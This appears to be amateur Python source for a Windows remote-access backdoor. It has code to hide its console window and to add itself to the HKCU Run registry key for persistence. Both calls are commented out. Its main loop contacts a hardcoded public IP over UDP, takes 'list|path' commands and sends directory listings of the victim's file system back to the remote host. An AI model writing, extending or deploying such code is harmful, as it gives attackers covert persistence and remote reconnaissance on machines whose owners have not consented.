import socket
import os
import time
import win32gui, win32con
import winreg as reg1

the_program_to_hide = win32gui.GetForegroundWindow()
#win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)
def AddToRegistry():
   # in python __file__ is denoeted as the instant of
   # file path where it was run or executed
   # so if it was executed from desktop,
   # then __file__ will be
   # c:\users\current_user\desktop
   pth1 =os.path.dirname(os.path.realpath(__file__))
   # Python file name with extension
   s_name1="mYscript.py"
   # The file name is joined to end of path address
   address1=os.path.join(pth1,s_name1)
   # key we want to modify or change is HKEY_CURRENT_USER
   # key value is Software\Microsoft\Windows\CurrentVersion\Run
   key1 = reg1.HKEY_CURRENT_USER
   key_value1 ="Software\Microsoft\Windows\CurrentVersion\Run"
   # open the key to make modifications or changes to
   open=reg1.OpenKey(key1,key_value1,0,reg1.KEY_ALL_ACCESS)
   # change or modifiy the opened key
   reg1.SetValueEx(open,"any_name",0,reg1.REG_SZ,address1)
   # now close the opened key
   reg1.CloseKey(open)

#AddToRegistry()
def Main():

    ready = False
    host=socket.gethostbyname(socket.gethostname()) #client ip
    print(host)
    port = 4005
    address = '192.168.233.1'
    server = ('46.118.249.220', 4000)

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind((host,port))
    #s.settimeout(2)
    try:
        s.sendto("here!".encode('utf-8'), server)
        data, addr = s.recvfrom(1024)
    except Exception as e:
        print(str(e))
    print("aaaa")

    #data, server = s.recvfrom(1024)
    data = 0
    while True:
        if ready == False:
            try:
                print("tried")
                host=socket.gethostbyname(socket.gethostname())
                print("tried1") #client ip
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                print("tried2")
                s.bind((host,port))
                print("tried3")
                s.sendto("!".encode('utf-8'), server)
                print("tried4")
                data = 0
                data, addr = s.recvfrom(1024)
                print("READY")
                ready = True
            except Exception as e:
                print(str(e))
                time.sleep(1)
                print("waiting")
                s.close()
        if ready == True:
            print(data)
            try:
                data = data.decode("utf-8")
            except:
                pass
            print(data)
            print("Message from: " + str(addr))
            print("From connected user: " + data)
            data_commands = data.split("|")
            if data == "q":
                s.close()
                Main()
            if data_commands[0] == "list":
                command_answer = os.listdir(data_commands[1])
                s.sendto(str(command_answer).encode('utf-8'), addr)
                ready = False
                print("Checking for connection")
                s.close()
            else:
                print("Sending: " + data)
                s.sendto(data.encode('utf-8'), server)
                #data, addr = s.recvfrom(1024)
                ready = False
                print("Checking for connection")
                s.close()
    s.close()

if __name__=='__main__':
    Main()
